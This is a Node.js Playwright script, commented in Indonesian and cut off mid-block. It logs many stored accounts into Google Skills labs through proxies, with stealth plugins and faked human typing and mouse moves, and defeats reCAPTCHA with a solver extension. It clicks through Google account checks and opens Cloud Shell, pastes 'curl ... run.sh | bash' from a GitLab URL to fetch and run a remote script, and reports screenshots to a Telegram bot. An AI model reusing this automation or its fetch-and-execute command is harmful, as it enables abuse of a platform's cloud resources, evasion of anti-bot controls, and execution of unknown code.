require('dotenv').config();
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const {
    chromium
} = require("playwright-extra");
const stealth = require("puppeteer-extra-plugin-stealth");

function loadProxy() {
    const proxyFile = path.resolve(__dirname, 'proxy.txt');
    if (!fs.existsSync(proxyFile))
        return null;
    const lines = fs.readFileSync(proxyFile, 'utf-8').split('\n');
    for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed && !trimmed.startsWith('#'))
            return trimmed;
    }
    return null;
}

function parseProxyString(proxyStr) {
    try {
        const url = new URL(proxyStr);
        const server = `${url.protocol}//${url.hostname}:${url.port}`;
        const result = {
            server
        };
        if (url.username)
            result.username = decodeURIComponent(url.username);
        if (url.password)
            result.password = decodeURIComponent(url.password);
        return result;
    } catch {
        return {
            server: proxyStr
        };
    }
}

const CONFIG = {
    LOGIN_URL: "https://www.skills.google/users/sign_in",
    LAB_URL: "https://www.skills.google/focuses/86502?parent=catalog",
    PROFILES_DIR: path.resolve(__dirname, "profiles"),
    CREDENTIALS_FILE: path.resolve(__dirname, "akun.txt"),
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '',
    RECAPTCHA_SITEKEY: "6LeVI8IUAAAAAJNdox5eTkYrw9SbvhZ1TFyv3iHr",
    MIN_DELAY: 2000,
    MAX_DELAY: 5000,
};

if (!CONFIG.TELEGRAM_BOT_TOKEN) {
    console.warn('  ⚠  TELEGRAM_BOT_TOKEN tidak ditemukan di .env');
}

function randomDelay(min = CONFIG.MIN_DELAY, max = CONFIG.MAX_DELAY) {
    const ms = Math.floor(Math.random() * (max - min + 1)) + min;
    return new Promise((r) => setTimeout(r, ms));
}

async function humanType(locator, text) {
    for (const char of text) {
        await locator.pressSequentially(char, {
            delay: 50 + Math.random() * 120
        });
    }
}

async function randomMouseMove(page) {
    const vp = page.viewportSize() || {
        width: 1280,
        height: 720
    };
    const x = Math.floor(Math.random() * vp.width * 0.8) + vp.width * 0.1;
    const y = Math.floor(Math.random() * vp.height * 0.8) + vp.height * 0.1;
    await page.mouse.move(x, y, {
        steps: Math.floor(Math.random() * 10) + 5
    });
}

function loadAllCredentials() {
    const raw = fs.readFileSync(CONFIG.CREDENTIALS_FILE, "utf-8");
    const accounts = raw.split('\n')
        .map(l => l.trim())
        .filter(Boolean)
        .map(line => {
            const [email, ...passwordParts] = line.split(':');
            const password = passwordParts.join(':');
            return {
                email,
                password
            };
        })
        .filter(({
                email,
                password
            }) => email && password);
    if (!accounts.length)
        throw new Error('Tidak ada akun valid di akun.txt');
    return accounts;
}

const TG_API = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}`;

async function tgSendPhoto(imageBuffer, caption) {
    const tmpFile = path.resolve(__dirname, '_captcha_tmp.png');
    fs.writeFileSync(tmpFile, imageBuffer);

    const FormData = (await import('form-data')).default;
    const form = new FormData();
    form.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
    form.append('photo', fs.createReadStream(tmpFile));
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    const res = await axios.post(`${TG_API}/sendPhoto`, form, {
        headers: form.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
    });

    try {
        fs.unlinkSync(tmpFile);
    } catch {}
    return res.data.result.message_id;
}

async function tgSendMessage(text) {
    try {
        await axios.post(`${TG_API}/sendMessage`, {
            chat_id: CONFIG.TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'HTML',
        });
    } catch (e) {
        console.log(`  ✘ Telegram gagal kirim: ${e.message.substring(0, 50)}`);
    }
}

async function runCloudShell(context, consoleLink, password, projectId, studentEmail = '', studentPassword = '') {
    console.log('\n┌─────────────────────────────────────────');
    console.log('│  Cloud Shell');
    console.log('└─────────────────────────────────────────');
    await tgSendMessage('🖥️ <b>Membuka Cloud Shell...</b>');

    const shellPage = await context.newPage();
    try {
        await shellPage.goto(consoleLink, {
            waitUntil: 'domcontentloaded',
            timeout: 60000
        });
        await randomDelay(2000, 3000);

        for (let i = 0; i < 15; i++) {
            const url = shellPage.url();
            const isVerifPage = url.includes('speedbump') || url.includes('gaplustos') || url.includes('samlrp') || url.includes('accounts.google.com');

            if (!isVerifPage) {
                console.log(`  ✔ Halaman tujuan tercapai: ${url.substring(0, 80)}`);
                break;
            }

            console.log(`  ~ Verifikasi Google (${i + 1}/15): ${url.substring(0, 80)}`);

            if (url.includes('/signin/rejected') || url.includes('rrk=21')) {
                console.log('  → Google rejected SSO — coba manual sign-in akun student...');
                if (studentEmail && studentPassword) {
                    try {
                        await shellPage.goto('https://accounts.google.com/AddSession', {
                            waitUntil: 'domcontentloaded',
                            timeout: 30000
                        });
                        await randomDelay(1500, 2500);
                        const emailInput = shellPage.locator('input[type="email"]').first();
                        await emailInput.waitFor({
                            state: 'visible',
                            timeout: 8000
                        });
                        await emailInput.fill(studentEmail);
                        await shellPage.keyboard.press('Enter');
                        await shellPage.waitForLoadState('domcontentloaded', {
                            timeout: 15000
                        }).catch(() => {});
                        await randomDelay(1500, 2000);
                        const pwdInput2 = shellPage.locator('input[type="password"]').first();
                        await pwdInput2.waitFor({
                            state: 'visible',
                            timeout: 8000
                        });
                        await pwdInput2.fill(studentPassword);
                        await shellPage.keyboard.press('Enter');
                        await shellPage.waitForLoadState('domcontentloaded', {
                            timeout: 20000
                        }).catch(() => {});
                        await randomDelay(2000, 3000);
                        console.log('  ✔ Manual sign-in student selesai — navigasi ulang ke console link...');
                        await shellPage.goto(consoleLink, {
                            waitUntil: 'domcontentloaded',
                            timeout: 60000
                        });
                        await randomDelay(2000, 3000);
                    } catch (e) {
                        console.log(`  ✘ Manual sign-in gagal: ${e.message.substring(0, 80)}`);
                    }
                } else {
                    console.log('  ✘ studentEmail/Password tidak tersedia, tidak bisa sign-in manual.');
                }
                continue;
            }

            if (url.includes('/challenge/pwd') || url.includes('/signin/v2/challenge/pwd')) {
                console.log('  → Password challenge — mengisi password...');
                try {
                    const pwdInput = shellPage.locator('input[type="password"]').first();
                    await pwdInput.waitFor({
                        state: 'visible',
                        timeout: 5000
                    });
                    await pwdInput.fill('');
                    await pwdInput.type(password, {
                        delay: 60
                    });
                    console.log('  ✔ Password diisi');
                    await new Promise(r => setTimeout(r, 500));
                    const nextBtn = shellPage.getByRole('button', {
                        name: 'Next',
                        exact: false
                    });
                    await nextBtn.click({
                        timeout: 5000
                    });
                    console.log('  ✔ Klik Next');
                    await shellPage.waitForLoadState('domcontentloaded', {
                        timeout: 15000
                    }).catch(() => {});
                    await randomDelay(2000, 3000);
                } catch (e) {
                    console.log(`  ✘ Gagal isi password: ${e.message.substring(0, 60)}`);
                }
                continue;
            }

            const btnTexts = await shellPage.evaluate(() =>
                    Array.from(document.querySelectorAll('button')).map(b => b.innerText.trim()).filter(Boolean).join(' | ')).catch(() => '');
            if (btnTexts)
                console.log(`  ⬡ Tombol tersedia: ${btnTexts.substring(0, 200)}`);

            const candidates = ['Continue as student', 'Lanjutkan sebagai siswa', 'Saya mengerti', 'I understand', 'Lanjutkan', 'Continue', 'Accept', 'Setuju', 'Next'];
            let clicked = false;
            for (const label of candidates) {
                try {
                    const btn = shellPage.getByRole('button', {
                        name: label,
                        exact: false
                    });
                    if (await btn.isVisible({
                            timeout: 1000
                        }).catch(() => false)) {
                        await btn.click({
                            timeout: 5000
                        });
                        console.log(`  ✔ Klik "${label}"`);
                        await shellPage.waitForLoadState('domcontentloaded', {
                            timeout: 15000
                        }).catch(() => {});
                        await randomDelay(2000, 3000);
                        clicked = true;
                        break;
                    }
                } catch {}
            }

            if (!clicked) {
                console.log('  ~ Tidak ada tombol — menunggu auto-redirect...');
                await randomDelay(2000, 3000);
            }

            const newUrl = shellPage.url();
            if (!newUrl.includes('speedbump') && !newUrl.includes('gaplustos') && !newUrl.includes('samlrp') && !newUrl.includes('accounts.google.com')) {
                console.log('  ✔ Verifikasi Google berhasil dilewati!');
                break;
            }
        }

        async function dismissStudentDialog() {
            try {
                const btn = shellPage.getByRole('button', {
                    name: /continue as student|lanjutkan sebagai siswa/i
                });
                if (await btn.isVisible({
                        timeout: 1500
                    }).catch(() => false)) {
                    await btn.click({
                        timeout: 5000
                    });
                    console.log('  ✔ Dialog "Continue as student" di-dismiss');
                    await randomDelay(1500, 2500);
                }
            } catch {}
        }

        await dismissStudentDialog();

        try {
            await shellPage.locator('input.mdc-checkbox__native-control').first().check({
                timeout: 10000
            });
            await shellPage.locator("button:has-text('Agree and continue')").click({
                timeout: 10000
            });
            console.log('  ✔ TOS disetujui');
            await randomDelay(3000, 5000);
        } catch {}

        console.log('  ~ Menunggu tombol Cloud Shell...');
        await dismissStudentDialog();
        const shellBtn = shellPage.locator('button[aria-label*="Cloud Shell"], button:has(mat-icon[data-mat-icon-name="devshell"])');
        await shellBtn.waitFor({
            state: 'visible',
            timeout: 60000
        });
        await dismissStudentDialog();
        await shellBtn.click();
        console.log('  → Menyalakan Cloud Shell...');

        console.log('  ~ Menunggu TOS dialog Cloud Shell...');
        for (let i = 0; i < 20; i++) {
            await new Promise(r => setTimeout(r, 2000));
            await dismissStudentDialog();

            if (i === 0 || i === 4) {
                for (const frame of shellPage.frames()) {
                    const btnTexts = await frame.evaluate(() =>
                            Array.from(document.querySelectorAll('button')).map(b => b.innerText.trim()).filter(Boolean).join(' | ')).catch(() => '');
                    if (btnTexts)
                        console.log(`  ⬡ [${frame.url().substring(0, 60)}] ${btnTexts.substring(0, 200)}`);
                }
            }

            let clicked = false;
            for (const frame of shellPage.frames()) {
                try {
                    const cb = frame.locator('input.mdc-checkbox__native-control, input[type="checkbox"]').first();
                    if (await cb.isVisible({
                            timeout: 500
                        }).catch(() => false)) {
                        await cb.check({
                            timeout: 3000
                        });
                        console.log(`  ✔ Checkbox dicentang [${frame.url().substring(0, 60)}]`);
                        await new Promise(r => setTimeout(r, 1500));
                    }

                    for (const label of['Start Cloud Shell', 'Agree and continue']) {
                        const btn = frame.getByRole('button', {
                            name: label,
                            exact: false
                        });
                        if (await btn.isVisible({
                                timeout: 500
                            }).catch(() => false)) {
                            await btn.click({
                                timeout: 5000
                            });
                            console.log(`  ✔ Klik "${label}" [${frame.url().substring(0, 60)}]`);
                            clicked = true;
                            break;
                        }
                    }
                    if (clicked)
                        break;
                } catch {}
            }

            if (clicked)
                break;
            console.log(`  ~ TOS belum muncul... (${(i + 1) * 2}s)`);
            if (i === 19)
                console.log('  ✘ Timeout TOS dialog Cloud Shell.');
        }

        async function clickInFrames(buttonName) {
            for (const frame of shellPage.frames()) {
                try {
                    const btn = frame.getByRole('button', {
                        name: buttonName,
                        exact: false
                    });
                    if (await btn.isVisible({
                            timeout: 800
                        }).catch(() => false)) {
                        await btn.click({
                            timeout: 5000
                        });
                        console.log(`  ✔ Klik "${buttonName}" [${frame.url().substring(0, 70)}]`);
                        await new Promise(r => setTimeout(r, 2000));
                        return true;
                    }
                } catch {
                    continue;
                }
            }
            return false;
        }

        async function findTerminalFrame() {
            for (const f of shellPage.frames()) {
                if (!f.url().includes('devshell') && !f.url().includes('embeddedcloudshell'))
                    continue;
                try {
                    const ta = f.locator('textarea.xterm-helper-textarea');
                    if (await ta.isVisible({
                            timeout: 500
                        }).catch(() => false))
                        return f;
                } catch {}
            }
            return null;
        }

        let terminalFrame = await findTerminalFrame();
        if (terminalFrame) {
            console.log(`  ✔ Terminal sudah siap (existing session): ${terminalFrame.url().substring(0, 70)}`);
        } else {
            console.log('  ~ Menunggu dialog Continue / Authorize...');
            let continueClicked = false;
            let authorizeClicked = false;
            for (let i = 0; i < 40; i++) {
                await dismissStudentDialog();

                terminalFrame = await findTerminalFrame();
                if (terminalFrame) {
                    console.log(`  ✔ Terminal siap tanpa dialog (${i * 2}s): ${terminalFrame.url().substring(0, 70)}`);
                    break;
                }

                if (!continueClicked) {
                    if (await clickInFrames('Continue')) {
                        console.log('  ✔ Continue OK');
                        continueClicked = true;
                        await randomDelay(3000, 5000);
                    }
                }
                if (!authorizeClicked) {
                    if (await clickInFrames('Authorize')) {
                        console.log('  ✔ Authorize OK');
                        authorizeClicked = true;
                    }
                }
                if (authorizeClicked)
                    break;
                await new Promise(r => setTimeout(r, 2000));
            }
        }

        // --- BLOK YANG SEBELUMNYA TIDAK SENGAJA TERHAPUS ---
        if (!terminalFrame) {
            console.log('  ~ Menunggu terminal siap...');
            for (let i = 0; i < 30; i++) {
                await new Promise(r => setTimeout(r, 2000));
                terminalFrame = await findTerminalFrame();
                if (terminalFrame) {
                    console.log(`  ✔ Terminal ditemukan: ${terminalFrame.url().substring(0, 70)}`);
                    break;
                }
                console.log(`  ~ Menunggu terminal... (${(i + 1) * 2}s)`);
            }
        }
        // ----------------------------------------------------

        if (!terminalFrame) {
            throw new Error('Terminal frame tidak ditemukan setelah 60s');
        }

        await shellPage.keyboard.press('Escape');
        await new Promise(r => setTimeout(r, 500));
        await dismissStudentDialog();

        const xtermTextarea = terminalFrame.locator('textarea.xterm-helper-textarea');
        await xtermTextarea.click({
            timeout: 10000
        });
        console.log('  ✔ Terminal difokuskan');
        await new Promise(r => setTimeout(r, 1000));

        async function pasteCommand(cmd) {
            await shellPage.evaluate((text) => navigator.clipboard.writeText(text), cmd);
            await xtermTextarea.click();
            await shellPage.keyboard.press('Control+Shift+V');
            await new Promise(r => setTimeout(r, 500));
        }

        await xtermTextarea.press('Control+c');
        await new Promise(r => setTimeout(r, 1000));

        if (projectId) {
            const gcloudCmd = `gcloud config set project ${projectId}`;
            console.log(`  → Checkpoint: ${gcloudCmd}`);
            await pasteCommand(gcloudCmd);
            await xtermTextarea.press('Enter');
            await new Promise(r => setTimeout(r, 8000));
            console.log('  ✔ Project aktif di-set!');
        }

        const command = "curl https://gitlab.com/barbieanay003/seger/-/raw/main/run.sh | bash";
        console.log('  → Paste perintah via clipboard...');
        await pasteCommand(command);
        await new Promise(r => setTimeout(r, 500));
        await xtermTextarea.press('Enter');
        console.log('  ✔ Perintah berhasil dieksekusi!');

        await new Promise(r => setTimeout(r, 8000));
        try {
            const ssBuffer = await shellPage.screenshot({
                type: 'png'
            });
            console.log('  → Screenshot Cloud Shell diambil, kirim ke Telegram...');
            await tgSendPhoto(ssBuffer, '🖥️ <b>Cloud Shell — setelah eksekusi script</b>');
            console.log('  ✔ Screenshot Cloud Shell terkirim ke Telegram!');
        } catch (ssErr) {
            console.log(`  ⚠ Gagal screenshot Cloud Shell: ${ssErr.message.substring(0, 60)}`);
            await tgSendMessage('✅ <b>Cloud Shell: Script berhasil dieksekusi!</b>');
        }

        await new Promise(r => setTimeout(r, 3000));

    } catch (e) {
        console.log(`  ✘ Cloud Shell error: ${e.message}`);
        await tgSendMessage(`❌ Cloud Shell error: ${e.message.substring(0, 100)}`);
    }
}

(async() => {
    chromium.use(stealth());

    const accounts = loadAllCredentials();
    console.log(`\n  ✔ Ditemukan ${accounts.length} akun di akun.txt:`);
    accounts.forEach((a, i) => console.log(`     ${i + 1}. ${a.email}`));

    // --- PENGATURAN OTOMATIS (Tanpa Prompt) ---
    const selected = accounts; // Jalankan semua akun
    const threads = 1; // 1 thread concurrent
    const maxLoops = 1; // 1x jalan (tanpa loop)
    const useHeadless = false; // Wajib false agar ekstensi berjalan

    console.log(`\n  → Menjalankan semua ${selected.length} akun secara otomatis.`);
    console.log(`  → Thread: ${threads}`);
    console.log(`  → Loop mode: 1x`);
    console.log(`  → Headless: tidak\n`);

    async function processAccount({
        email,
        password
    }, label) {
        console.log(`\n${'═'.repeat(50)}`);
        console.log(`  ${label}: ${email}`);
        console.log(`${'═'.repeat(50)}`);

        const emailSlug = email.replace(/[@.]/g, '_');
        const profileDir = path.join(CONFIG.PROFILES_DIR, emailSlug);
        if (!fs.existsSync(profileDir))
            fs.mkdirSync(profileDir, {
                recursive: true
            });
        console.log(`  → Profile: ${profileDir}`);

        const proxyStr = loadProxy();
        const proxyConfig = proxyStr ? parseProxyString(proxyStr) : undefined;
        if (proxyConfig)
            console.log(`  → Proxy: ${proxyConfig.server}`);
        else
            console.log('  → Proxy: tidak dipakai');

        console.log('  → Memulai browser...');
        const extensionPath = path.resolve(__dirname, "Humans");

        const context = await chromium.launchPersistentContext(profileDir, {
            headless: useHeadless, // Menggunakan variabel otomatis (false)
            viewport: {
                width: 1366,
                height: 768
            },
            args: [
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-web-security",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-setuid-sandbox",
                `--disable-extensions-except=${extensionPath}`, 
`--load-extension=${extensionPath}`
            ],
            permissions: ['clipboard-read', 'clipboard-write'],
            ...(proxyConfig ? {
                proxy: proxyConfig
            }
                 : {}),
            locale: "en-US",
            timezoneId: "Asia/Jakarta",
        });

        const page = context.pages()[0] || (await context.newPage());

        try {
            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Step 1 — Login');
            console.log('└─────────────────────────────────────────');
            await page.goto(CONFIG.LOGIN_URL, {
                waitUntil: "domcontentloaded",
                timeout: 60000
            });
            await randomDelay();
            await randomMouseMove(page);

            const currentUrl = page.url();
            const emailBtn = page.locator('#use-email-and-password-button');
            const isOnLoginPage = currentUrl.includes("sign_in") && await emailBtn.isVisible({
                timeout: 8000
            }).catch(() => false);

            if (!isOnLoginPage) {
                console.log('  ✔ Sudah login — lewati fase login.');
            } else {
                console.log('  → Klik "Use email and password"...');
                const useEmailLink = page.locator('#use-email-and-password-button');
                await useEmailLink.waitFor({
                    state: "visible",
                    timeout: 15000
                });
                await randomDelay(1000, 2000);
                await randomMouseMove(page);
                await useEmailLink.click();
                await randomDelay();

                console.log('  → Mengisi email dan password...');

                const emailField = page.locator('input[type="email"], input[name="user[email]"], input#user_email');
                await emailField.waitFor({
                    state: "visible",
                    timeout: 15000
                });
                await emailField.click();
                await randomDelay(500, 1200);
                await humanType(emailField, email);

                await randomMouseMove(page);
                await randomDelay(800, 1500);

                const passwordField = page.locator('input[type="password"], input[name="user[password]"], input#user_password');
                await passwordField.waitFor({
                    state: "visible",
                    timeout: 15000
                });
                await passwordField.click();
                await randomDelay(500, 1200);
                await humanType(passwordField, password);

                await randomMouseMove(page);
                await randomDelay();

                console.log('  → Klik Sign in...');
                const signInBtn = page.locator('ql-button[type="submit"][data-analytics-action="clicked_sign_in"]');
                await signInBtn.waitFor({
                    state: "visible",
                    timeout: 10000
                });
                await signInBtn.click();

                await page.waitForLoadState("domcontentloaded", {
                    timeout: 30000
                });
                await randomDelay();

                console.log(`  ✔ Login selesai → ${page.url()}`);
            }

            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Step 2 — Buka Lab');
            console.log('└─────────────────────────────────────────');
            await page.goto(CONFIG.LAB_URL, {
                waitUntil: "domcontentloaded",
                timeout: 60000
            });

            page.on('response', async res => {
                const url = res.url();
                if (url.includes('/focuses/run/') || url.includes('verify_v3_recaptcha')) {
                    console.log(`  ← [NET] ${res.status()} ${url.substring(0, 100)}`);
                    try {
                        const body = await res.text();
                        console.log(`  ← [NET] ${body.substring(0, 200)}`);
                    } catch {}
                }
            });

            await randomDelay();
            await randomMouseMove(page);

            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Step 3 — Start Lab');
            console.log('└─────────────────────────────────────────');
            console.log('  ~ Menunggu ql-lab-control-panel...');
            await page.waitForSelector('ql-lab-control-panel', {
                state: 'attached',
                timeout: 30000
            });
            console.log('  ✔ Panel ditemukan.');

            const btnState = await page.evaluate(() => {
                const panel = document.querySelector('ql-lab-control-panel');
                return panel ? panel.getAttribute('labcontrolbutton') : null;
            });
            console.log(`  → State labcontrolbutton: ${btnState}`);

            let labIsAlreadyRunning = false;
            try {
                const parsed = JSON.parse(btnState);
                if (parsed.running === true || parsed.pending === true) {
                    labIsAlreadyRunning = true;
                }
            } catch {}

            if (labIsAlreadyRunning) {
                console.log('  ✔ Lab sedang berjalan — lewati Start Lab & CAPTCHA, langsung ke ekstraksi.');
            } else {
                try {
                    await page.waitForFunction(() => {
                        const panel = document.querySelector('ql-lab-control-panel');
                        if (!panel)
                            return false;
                        const attr = panel.getAttribute('labcontrolbutton');
                        if (!attr)
                            return false;
                        try {
                            return JSON.parse(attr).disabled === false;
                        } catch {
                            return false;
                        }
                    }, {
                        timeout: 30000
                    });
                    console.log('  ✔ Tombol Start Lab aktif!');
                } catch {
                    console.log('  ⚠  Tombol masih disabled setelah 30s.');
                }

                await randomDelay(1000, 2500);
                await randomMouseMove(page);

                console.log('  → Klik Start Lab...');
                const clickResult = await page.evaluate(() => {
                    const panel = document.querySelector('ql-lab-control-panel');
                    if (!panel || !panel.shadowRoot)
                        return 'no-panel-shadow';
                    const controlBtn = panel.shadowRoot.querySelector('ql-lab-control-button, #lab-control-button');
                    if (!controlBtn || !controlBtn.shadowRoot)
                        return 'no-control-btn';
                    const qlBtn = controlBtn.shadowRoot.querySelector('ql-button');
                    if (!qlBtn)
                        return 'no-ql-button';
                    if (qlBtn.shadowRoot) {
                        const mdBtn = qlBtn.shadowRoot.querySelector('md-filled-button');
                        if (mdBtn && mdBtn.shadowRoot) {
                            const btn = mdBtn.shadowRoot.querySelector('button');
                            if (btn) {
                                btn.click();
                                return 'clicked-deep';
                            }
                        }
                        const btn = qlBtn.shadowRoot.querySelector('button');
                        if (btn) {
                            btn.click();
                            return 'clicked-shadow-btn';
                        }
                    }
                    qlBtn.click();
                    return 'clicked-ql-button';
                });
                console.log(`  ✔ Klik result: ${clickResult}`);

                console.log('\n┌─────────────────────────────────────────');
                console.log('│  Step 4 — Deteksi CAPTCHA');
                console.log('└─────────────────────────────────────────');
                console.log('  ~ Memeriksa apakah CAPTCHA diperlukan...');

                let needsCaptcha = false;
                let labAlreadyStarting = false;

                for (let poll = 0; poll < 20; poll++) {
                    await new Promise(r => setTimeout(r, 1000));

                    const labState = await page.evaluate(() => {
                        const panel = document.querySelector('ql-lab-control-panel');
                        if (!panel)
                            return {
                                starting: false
                            };
                        if (panel.shadowRoot) {
                            const text = panel.shadowRoot.textContent || '';
                            if (text.includes('End Lab') || text.includes('Provisioning'))
                                return {
                                    starting: true
                                };
                        }
                        const attr = panel.getAttribute('labcontrolbutton');
                        if (attr) {
                            try {
                                const s = JSON.parse(attr);
                                if (s.running || s.pending)
                                    return {
                                        starting: true
                                    };
                            } catch {}
                        }
                        return {
                            starting: false
                        };
                    }).catch(() => ({
                                starting: false
                            }));

                    if (labState.starting) {
                        console.log('  ✔ Lab mulai berjalan — tidak perlu CAPTCHA!');
                        labAlreadyStarting = true;
                        break;
                    }

                    const anchorFrame = page.frames().find(f => {
                        const url = f.url();
                        return url.includes('recaptcha') && url.includes('anchor') && !url.includes('invisible');
                    });

                    if (anchorFrame) {
                        console.log(`  ✔ reCAPTCHA v2 terdeteksi: ${anchorFrame.url().substring(0, 100)}`);
                        needsCaptcha = true;
                        break;
                    }

                    if (poll % 5 === 4) {
                        console.log(`  ~ Menunggu... (${poll + 1}s) — frames: ${page.frames().map(f => f.url().substring(0, 60)).join(' | ')}`);
                    }
                }

                if (!needsCaptcha && !labAlreadyStarting) {
                    const lastCheck = page.frames().find(f => f.url().includes('recaptcha') && f.url().includes('anchor') && !f.url().includes('invisible'));
                    if (lastCheck) {
                        needsCaptcha = true;
                        console.log('  ✔ reCAPTCHA ditemukan (deteksi akhir)');
                    } else {
                        console.log('  ~ Tidak ada CAPTCHA setelah 20s — asumsikan lab mulai...');
                        labAlreadyStarting = true;
                    }
                }

                if (needsCaptcha) {
                    await randomDelay(1000, 2000);

                    console.log('  → Klik checkbox reCAPTCHA...');
                    let clicked = false;

                    const anchorFrame = page.frames().find(f => {
                        const url = f.url();
                        return url.includes('recaptcha') && url.includes('anchor') && !url.includes('invisible');
                    });

                    if (anchorFrame) {
                        try {
                            const checkbox = anchorFrame.locator('#recaptcha-anchor, .recaptcha-checkbox-border');
                            await checkbox.waitFor({
                                state: 'visible',
                                timeout: 5000
                            });
                            await randomDelay(500, 1500);
                            await checkbox.click();
                            console.log('  ✔ Checkbox reCAPTCHA diklik via frame!');
                            clicked = true;
                        } catch (e) {
                            console.log(`  ⚠  Klik langsung gagal: ${e.message.substring(0, 60)}`);
                        }
                    }

                    if (!clicked) {
                        console.log('  → Coba pendekatan locator...');
                        try {
                            const iframes = page.locator('iframe[src*="recaptcha"][src*="anchor"]');
                            const count = await iframes.count();
                            console.log(`  → Ditemukan ${count} iframe reCAPTCHA`);

                            for (let i = 0; i < count; i++) {
                                const src = await iframes.nth(i).getAttribute('src');
                                if (src && src.includes('size=invisible'))
                                    continue;

                                const siteKeyMatch = src?.match(/k=([A-Za-z0-9_-]+)/);
                                let frameSelector = `iframe[src*="recaptcha"][src*="anchor"]`;
                                if (siteKeyMatch)
                                    frameSelector = `iframe[src*="${siteKeyMatch[1]}"][src*="anchor"]`;

                                try {
                                    const frame = page.frameLocator(frameSelector).first();
                                    const checkbox = frame.locator('#recaptcha-anchor');
                                    await checkbox.click({
                                        timeout: 5000
                                    });
                                    console.log(`  ✔ Checkbox diklik via locator (iframe ${i})!`);
                                    clicked = true;
                                    break;
                                } catch {}
                            }
                        } catch {}
                    }

                    if (!clicked) {
                        console.log('  → Coba via sitekey...');
                        for (const sitekey of[CONFIG.RECAPTCHA_SITEKEY, '6LeOI8IUAAAAAPkHlMAE9NReCD_1WD81iYlBlCnV']) {
                            try {
                                const frame = page.frameLocator(`iframe[src*="${sitekey}"]`).first();
                                const checkbox = frame.locator('#recaptcha-anchor');
                                await checkbox.click({
                                    timeout: 5000
                                });
                                console.log(`  ✔ Checkbox diklik (sitekey: ${sitekey.substring(0, 10)}…)!`);
                                clicked = true;
                                break;
                            } catch {}
                        }
                    }

                    if (!clicked) {
                        console.log('  ✘ Tidak bisa klik checkbox reCAPTCHA.');
                    }

                    console.log('  ~ Menunggu reCAPTCHA diproses...');
                    let bframeExists = false;
                    for (let w = 0; w < 16; w++) {
                        await new Promise(r => setTimeout(r, 500));
                        if (page.frames().some(f => f.url().includes('bframe'))) {
                            bframeExists = true;
                            break;
                        }
                        const af = page.frames().find(f => f.url().includes('anchor') && !f.url().includes('invisible'));
                        if (af) {
                            const checked = await af.locator('#recaptcha-anchor[aria-checked="true"]').isVisible({
                                timeout: 300
                            }).catch(() => false);
                            if (checked)
                                break;
                        }
                    }
                    if (!bframeExists)
                        bframeExists = page.frames().some(f => f.url().includes('bframe'));

                    if (bframeExists) {
                        console.log('  → Image challenge muncul — memicu ekstensi "Human"...');

                        const maxRetries = 3;
                        let extSolved = false;
                        let launchLabAppeared = false;
                        const launchLabLocator = page.locator('.js-launch-button.js-lab-access-modal-button').first();

                        for (let attempt = 1; attempt <= maxRetries; attempt++) {
                            // Mencari ulang bframe di setiap percobaan karena URL atau frame bisa bergeser pasca-reload
                            const currentBframe = page.frames().find(f => f.url().includes('bframe'));
                            if (!currentBframe)
                                break;

                            try {
                                const extButton = currentBframe.locator('.help-button-holder').first();
                                await extButton.waitFor({
                                    state: 'visible',
                                    timeout: 10000
                                });
                                await extButton.click();
                                console.log(`  ✔ [Attempt ${attempt}] Tombol ekstensi diklik, menunggu proses bypass...`);

                                extSolved = false;

                                // Polling paralel multi-indikator
                                for (let wait = 0; wait < 40; wait++) {
                                    await new Promise(r => setTimeout(r, 500));

                                    if (await launchLabLocator.isVisible().catch(() => false)) {
                                        extSolved = true;
                                        launchLabAppeared = true;
                                        break;
                                    }

                                    const bframeIsVisible = await page.locator('iframe[src*="bframe"]').isVisible().catch(() => false);
                                    if (!bframeIsVisible) {
                                        extSolved = true;
                                        break;
                                    }

                                    const af = page.frames().find(f => f.url().includes('anchor') && !f.url().includes('invisible'));
                                    if (af) {
                                        const isChecked = await af.locator('#recaptcha-anchor[aria-checked="true"]').isVisible({
                                            timeout: 300
                                        }).catch(() => false);
                                        if (isChecked) {
                                            extSolved = true;
                                            break;
                                        }
                                    }

                                    const labIsStarting = await page.evaluate(() => {
                                        const panel = document.querySelector('ql-lab-control-panel');
                                        if (!panel)
                                            return false;
                                        const attr = panel.getAttribute('labcontrolbutton');
                                        if (attr) {
                                            try {
                                                const s = JSON.parse(attr);
                                                if (s.running || s.pending)
                                                    return true;
                                            } catch {}
                                        }
                                        return false;
                                    }).catch(() => false);

                                    if (labIsStarting) {
                                        console.log('  ✔ Lab terdeteksi mulai berjalan di latar belakang!');
                                        extSolved = true;
                                        break;
                                    }
                                }

                                if (extSolved) {
                                    console.log('  ✔ Ekstensi berhasil merespons!');

                                    if (launchLabAppeared || await launchLabLocator.isVisible().catch(() => false)) {
                                        console.log('  → Modal "Launch Lab" terdeteksi, mengklik...');
                                        await new Promise(r => setTimeout(r, 1000));
                                        await launchLabLocator.click({
                                            timeout: 5000
                                        });
                                        console.log('  ✔ Tombol "Launch Lab" berhasil diklik!');
                                    } else {
                                        console.log('  → Tidak ada modal Launch Lab. Lanjut.');
                                    }
                                    break; // Keluar dari loop retry
                                } else {
                                    console.log(`  ✘ [Attempt ${attempt}] Ekstensi timeout atau macet.`);
                                    if (attempt < maxRetries) {
                                        console.log('  → Reloading CAPTCHA...');
                                        try {
                                            const reloadBtn = currentBframe.locator('#recaptcha-reload-button').first();
                                            await reloadBtn.click({
                                                timeout: 5000
                                            });
                                            await new Promise(r => setTimeout(r, 3000)); // Jeda memuat gambar baru
                                        } catch (err) {
                                            console.log(`  ⚠ Gagal klik tombol reload: ${err.message.substring(0, 50)}`);
                                        }
                                    }
                                }
                            } catch (e) {
                                console.log(`  ✘ Gagal interaksi ekstensi di attempt ${attempt}: ${e.message.substring(0, 80)}`);
                            }
                        }

                        if (!extSolved) {
                            console.log('  ✘ Ekstensi gagal menembus reCAPTCHA setelah 3x percobaan.');
